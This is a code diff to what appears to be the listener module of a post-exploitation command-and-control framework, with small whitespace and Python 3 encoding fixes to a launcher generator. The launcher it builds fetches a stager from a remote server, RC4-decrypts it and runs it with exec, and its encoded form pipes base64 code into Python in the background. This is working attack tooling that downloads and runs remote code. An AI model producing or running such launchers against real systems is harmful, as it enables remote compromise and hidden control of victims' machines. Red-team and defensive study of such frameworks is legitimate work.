@@ -419,7 +419,6 @@ class Listener(object):
             
             if language.startswith('py'):
                 # Python
-                
                 launcherBase = 'import sys;'
                 if "https" in host:
                     # monkey patch ssl woohooo
@@ -449,7 +448,6 @@ class Listener(object):
                 routingPacket = packets.build_routing_packet(stagingKey, sessionID='00000000', language='PYTHON',
                                                              meta='STAGE0', additional='None', encData='')
                 b64RoutingPacket = base64.b64encode(routingPacket)
-                
                 launcherBase += "req=urllib2.Request(server+t);\n"
                 # add the RC4 packet to a cookie
                 launcherBase += "o.addheaders=[('User-Agent',UA), (\"Cookie\", \"session=%s\")];\n" % (b64RoutingPacket)
@@ -461,7 +459,7 @@ class Listener(object):
                         headerValue = header.split(':')[1]
                         # launcherBase += ",\"%s\":\"%s\"" % (headerKey, headerValue)
                         launcherBase += "req.add_header(\"%s\",\"%s\");\n" % (headerKey, headerValue)
-                
+
                 if proxy.lower() != "none":
                     if proxy.lower() == "default":
                         launcherBase += "proxy = urllib2.ProxyHandler();\n"
@@ -485,14 +483,13 @@ class Listener(object):
                 
                 # install proxy and creds globally, so they can be used with urlopen.
                 launcherBase += "urllib2.install_opener(o);\n"
-                
                 # download the stager and extract the IV
                 
                 launcherBase += "a=urllib2.urlopen(req).read();\n"
                 launcherBase += "IV=a[0:4];"
                 launcherBase += "data=a[4:];"
                 launcherBase += "key=IV+'%s';" % (stagingKey)
-                
+
                 # RC4 decryption
                 launcherBase += "S,j,out=range(256),0,[]\n"
                 launcherBase += "for i in range(256):\n"
@@ -507,9 +504,9 @@ class Listener(object):
                 launcherBase += "exec(''.join(out))"
                 
                 if encode:
-                    launchEncoded = base64.b64encode(launcherBase)
+                    launchEncoded = base64.b64encode(launcherBase.encode('UTF-8'))
                     launcher = "echo \"import sys,base64,warnings;warnings.filterwarnings(\'ignore\');exec(base64.b64decode('%s'));\" | /usr/bin/python &" % (
-                        launchEncoded)
+                        launchEncoded.decode('UTF-8'))
                     return launcher
                 else:
                     return launcherBase
